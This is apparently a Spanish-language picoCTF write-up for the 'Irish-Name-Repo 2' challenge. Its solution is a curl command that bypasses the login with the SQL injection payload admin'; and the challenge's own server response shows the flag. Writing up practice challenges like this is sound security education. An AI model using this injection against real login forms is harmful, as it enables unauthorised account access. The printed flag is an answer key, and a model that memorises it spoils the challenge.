# Irish-Name-Repo 2

## Objetivo 
Descripción:
Hay un sitio web funcionando en `https://jupiter.challenges.picoctf.org/problem/53751/`( [enlace](https://jupiter.challenges.picoctf.org/problem/53751/) ). Alguien ha pasado por alto el inicio de sesión antes y ahora se está fortaleciendo. ¡Intenta ver si aún puedes iniciar sesión! o http://jupiter.challenges.picoctf.org:53751

Sugerencias:
La contraseña está siendo filtrada.

## Solución
``` shell
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&password=loquesea&debug=1"
<pre>username: admin';
password: loquesea
SQL query: SELECT * FROM users WHERE name='admin';' AND password='loquesea'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>                                                                                                

```

## Notas


## Referencias
[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)